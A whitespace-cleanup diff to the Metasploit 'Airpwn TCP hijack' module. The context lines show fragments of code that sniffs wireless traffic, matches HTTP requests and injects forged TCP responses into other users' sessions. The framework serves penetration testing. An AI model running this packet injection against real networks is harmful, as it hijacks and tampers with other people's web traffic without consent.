@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -17,7 +17,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Lorcon2
 	include Msf::Auxiliary::Report
-	
+
 	def initialize
 		super(
 			'Name'        => 'Airpwn TCP hijack',
@@ -40,7 +40,7 @@ class Metasploit3 < Msf::Auxiliary
 				[
 				 	[ 'Airpwn' ]
 				],
-			'PassiveActions' => 
+			'PassiveActions' =>
 				[
 					'Capture'
 				],
@@ -50,7 +50,7 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				OptPath.new('SITELIST',	  [ false, "YAML file of URL/Replacement pairs for GET replacement",
-						File.join(Msf::Config.install_root, "data", "exploits", "wifi", "airpwn", "sitelist.yml") 
+						File.join(Msf::Config.install_root, "data", "exploits", "wifi", "airpwn", "sitelist.yml")
 					]),
 				OptBool.new('USESITEFILE', [ true, "Use site list file for match/response", "false"]),
 				OptString.new('FILTER',	  [ true, "Default BPF filter", "port 80"]),
@@ -114,10 +114,10 @@ class Metasploit3 < Msf::Auxiliary
 			# If we have headers
 			if r["txresponse"].scan(/[^:?]+: .+\n/m).size > 0
 			#  But not a content-length
-				if r["txresponse"].scan(/^Content-Length: /).size == 0 
+				if r["txresponse"].scan(/^Content-Length: /).size == 0
 					# Figure out the length and add it
 					loc = (/\n\n/m =~ r["txresponse"])
-					if loc == nil 
+					if loc == nil
 						print_status "AIRPWN: Response packet looks like HTTP headers but can't find end of headers.  Will inject as-is."
 					else
 						print_status "AIRPWN: Response packet looks like HTTP headers but has no Content-Length, adding one."
@@ -134,9 +134,9 @@ class Metasploit3 < Msf::Auxiliary
 		print_status "Opening wifi module."
 		open_wifi
 
-		self.wifi.filter = @filter if (@filter != "") 
+		self.wifi.filter = @filter if (@filter != "")
 		each_packet do |pkt|
-		
+
 			d3 = pkt.dot3
 
 			next if not d3
@@ -151,7 +151,7 @@ class Metasploit3 < Msf::Auxiliary
 
 			@http.each do |r|
 				hit = nil
-				r['regex'].each do |reg| 
+				r['regex'].each do |reg|
 					hit = tcp.payload.scan(/#{reg}/) || nil
 					break if hit.size != 0
 				end
@@ -201,7 +201,7 @@ class Metasploit3 < Msf::Auxiliary
 					injpkt.direction = Lorcon::Packet::LORCON_ADHOC_DS
 				end
 
-				self.wifi.inject(injpkt) or print_status("AIRPWN failed to inject packet: " + tx.error) 
+				self.wifi.inject(injpkt) or print_status("AIRPWN failed to inject packet: " + tx.error)
 
 				response.l4.seq = response.l4.seq + response.l5.payload.size
 				response.l4.flag_ack = 1
@@ -211,7 +211,7 @@ class Metasploit3 < Msf::Auxiliary
 				response.l4.fix!(response.l3.src_ip, response.l3.dst_ip, "")
 
 				injpkt.dot3 = response.pack
-				self.wifi.inject(injpkt) or print_status("AIRPWN failed to inject packet: " + tx.error) 
+				self.wifi.inject(injpkt) or print_status("AIRPWN failed to inject packet: " + tx.error)
 			end
 		end
 
